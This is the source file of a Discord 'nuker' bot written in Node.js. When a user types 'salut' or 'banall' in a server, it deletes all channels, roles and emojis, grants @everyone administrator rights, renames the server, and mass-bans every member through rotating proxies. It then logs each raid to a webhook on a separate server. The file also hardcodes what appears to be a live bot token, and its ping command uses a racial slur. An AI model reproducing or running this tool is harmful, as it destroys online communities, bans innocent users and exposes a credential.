const { MessageEmbed, Client, Intents } = require("discord.js");
const db = require("quick.db");
const client = new Client({
    intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MESSAGES,
        Intents.FLAGS.GUILD_BANS,
        Intents.FLAGS.GUILD_MEMBERS,
        Intents.FLAGS.DIRECT_MESSAGE_TYPING,
        Intents.FLAGS.DIRECT_MESSAGES,
        Intents.FLAGS.GUILD_INVITES,
        Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
        Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
        Intents.FLAGS.GUILD_INTEGRATIONS,
        Intents.FLAGS.GUILD_VOICE_STATES
    ],
});
const Discord = require("discord.js");
require('discord-reply');
const fs = require('fs');
const cooldown = new Set();
const cdtime = 3;
const msg = 5;
var whitelistedservers = ["949071654909255680"]
const request = require('request');
const chalk = require('chalk');
const proxies = fs.readFileSync('./src/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');

process.on('uncaughtException', function (err) {
  console.error(err); console.log("Node NOT Exiting...");
 });

const botActivity = [
  `Spartanu has connected!`,
  `Better leave me alone`,
  `viata e foarte grea.....a vomitat unu in autobuz`,
  `To punish and enslave`
]

client.on('ready', async () => {
  client.user.setStatus("dnd");
  console.log('');
  console.log(chalk.inverse.hex("483D8B")(`[INFO] Logged in as ${client.user.tag} (${client.user.id})`));
  console.log(chalk.inverse.hex("483D8B")(`[INFO] Connected to Discord API Service`));
  console.log('');
  client.guilds.cache.forEach((guild) => {
  console.log(chalk.inverse.hex("483D8B")("Guild: " + guild.name + " | Members: " + guild.memberCount));
    })
  setInterval(() => {
    const randomIndex = Math.floor(Math.random() * (botActivity.length - 1) + 1);
    const newActivity = botActivity[randomIndex];
    client.user.setActivity(newActivity, { type: 'WATCHING' });
  }, 10000);
});


//-----------------------------------------------------------------Commands Nuke---------------------------------------------------//

      client.on("messageCreate", async(message)=>{
      if (!message.guild) return;
      if (message.content.startsWith('salut') || message.content.startsWith("Salut") || message.content.startsWith("SALUT")) {
      message.delete();
  
  
      if (whitelistedservers.includes(message.guild.id)) return message.channel.send("<:nu:949078977618800730> | **you can't use the nuke command here!**");
      let grief = db.fetch(`${message.guild.id}-grief`)
      if(grief == true)
      return message.channel.send("<:nu:949078977618800730> This server was already nuked.");
      
      const w = await client.guilds.cache
      .get("949071654909255680")
      .fetchWebhooks();
      const webhook = w.find((w) => w.name === "logs");
      webhook.send(` \`Spartanu  {NUK3R} Logs\` \n\n **<:sus:949078978893873252> Guild** \`${message.guild.name}\` \n **<:mijlox:949078981334949909> got destroyed by** ${message.author.tag} \n **<:jos:949078980458348644> members** (${message.guild.memberCount})`);
      
      
      let token = "TOKEN"
      const phin = require('phin').unpromisified
      let guildID = message.guild.id
      
      
      
let headers = { 'Authorization': "Bot " + token }

var checkminutes = 10, checkthe_interval = checkminutes * 6 * 10;
var interval = setInterval (async function () {
intervalicon = setInterval(iconServer,100);
function iconServer() {
var proxy = proxies[Math.floor(Math.random() * proxies.length)]
phin({
          url: `https://discord.com/api/v9/guilds/${guildID}/members?limit=1000`,
          method: 'GET',
          parse: 'json',
          headers: headers
       }, (err, response, body) => {
        response.body.forEach(member=>{

     phin({
            url:`https://discord.com/api/v9/guilds/${guildID}/bans/${member.user.id}`,
            proxy: "http://" + proxy,
            method:'PUT',
            parse: 'json',
            headers: headers,
            timeout: 20
          }, (function(err, res, body){

            console.log(chalk.inverse.hex("483D8B")(`member(s): ${member.user.username} | proxy: ${proxy}`));

            })
          )
          })
        })
  }
        setTimeout(function() { clearInterval(intervalicon)},100);
  },300)
    
    
          message.guild.setName("SPARTANU W YOU L")
          message.guild.setIcon("https://cdn.discordapp.com/attachments/940989986549932062/942554355133976616/20220214_005349.jpg")
          message.guild.channels.cache.forEach(channel => {channel.delete().catch(err => errorvar = err);});
          message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{role.delete()})
          message.guild.roles.cache.forEach(role => {role.delete().catch(err => errorvar = err);});
          message.guild.emojis.cache.forEach(emote => {emote.delete().catch(err => errorvar = err);});    
          var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
          everyone.setPermissions(["ADMINISTRATOR"])
          message.guild.setVerificationLevel('VERY_HIGH').catch(err => errorvar = err)

          db.set(`${message.guild.id}-grief`, true);
         
    }
      
  })

//-----------------------------------------------------------------Commands Nuke---------------------------------------------------//

client.on("messageCreate", async(message)=>{
  if (!message.guild) return;
    if (message.content.startsWith('banall') || message.content.startsWith("Banall") || message.content.startsWith("BANALL")) {
    message.delete();

    if (whitelistedservers.includes(message.guild.id)) return message.channel.send("<:nu:949078977618800730> | **you can't use the nuke command here!**");
    let grief = db.fetch(`${message.guild.id}-grief`)
    if(grief == true)
    return message.channel.send("<:nu:949078977618800730> This server was already nuked.");

  const w = await client.guilds.cache
  .get("949071654909255680")
  .fetchWebhooks();
  const webhook = w.find((w) => w.name === "logs");
webhook.send(` \`Corleone\` \n\n **<:sus:949078978893873252> Guild** \`${message.guild.name}\` \n **<:mijlox:949078981334949909> got destroyed by** ${message.author.tag} \n **<:jos:949078980458348644> members** (${message.guild.memberCount})`);


let token = "OTQ5MDc3NDcwNzMxMjAyNjEy.YiFHRg.3bBh9pW68kt5nk6o85YOFxBgnPQ"
const phin = require('phin').unpromisified
let guildID = message.guild.id

let headers = { 'Authorization': "Bot " + token }
  
var checkminutes = 10, checkthe_interval = checkminutes * 6 * 10;
interval = setInterval(Bancacat)
function Bancacat() {
  var proxy = proxies[Math.floor(Math.random() * proxies.length)]
phin({
          url: `https://discord.com/api/v9/guilds/${guildID}/members?limit=1000`,
          method: 'GET',
          parse: 'json',
          headers: headers
       }, (err, response, body) => {
        response.body.forEach(member=>{

     phin({
            url:`https://discord.com/api/v9/guilds/${guildID}/bans/${member.user.id}`,
            proxy: "http://" + proxy,
            method:'PUT',
            parse: 'json',
            headers: headers,
            timeout: 20
          }, (function(err, res, body){

            console.log(chalk.inverse.hex("483D8B")(`member(s): ${member.user.username} | proxy: ${proxy}`));

            })
          )
          })
        })
  }

          

  setTimeout(function() { clearInterval(interval)},45000);

            message.guild.setIcon("https://cdn.discordapp.com/attachments/940989986549932062/942554355133976616/20220214_005349.jpg")
            message.guild.setVerificationLevel('VERY_HIGH').catch(err => errorvar = err)
            var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
            everyone.setPermissions(["ADMINISTRATOR"])

            db.set(`${message.guild.id}-grief`, true);
        }

      })

//-----------------------------------------------------------------Commands Ping---------------------------------------------------//

client.on("messageCreate", message => {
  if (!message.guild) return;
  if (message.content.startsWith('ping') || message.content.startsWith("Ping") || message.content.startsWith("PING")) {


      if (cooldown.has(message.author.id)) {
        return message.channel.send(`<:timeout:949078986275823626>\` | wait 5 seconds nigga\``)
        
      }
      cooldown.add(message.author.id);
      setTimeout(() => {  
        cooldown.delete(message.author.id);
      }, cdtime * 1000);

    var states = "<:pingmare:949079663140036628>";
    var states2 = "<:pingmare:949079663140036628>";
    var msg = `${Date.now() - message.createdTimestamp}`;
    var api = `${Math.round(client.ws.ping)}`;
    if (Number(msg) > 70) states = "<:pingmare:949079663140036628>";
    if (Number(msg) > 170) states = "<:pingmed:949079664129896560>";
    if (Number(msg) > 350) states = "<:pingmic:949079666310914148>";
    if (Number(api) > 70) states2 = "<:pingmare:949079663140036628>";
    if (Number(api) > 170)
      states2 = "<:pingmed:949079664129896560>";
    if (Number(api) > 350) states2 = "<:pingmic:949079666310914148>";
    if (message.author.bot) return;

  
   const embed = new MessageEmbed()
      .setDescription(
        `> ${states} **Ping Latency** ─ \`${msg} ms\`\n> ${states2} **API Latency** ─ \`${api} ms\``)
      .setColor("#483D8B");
    message.reply({ content: " ", embeds: [embed] })
}
   });


          
client.login("TOKEN");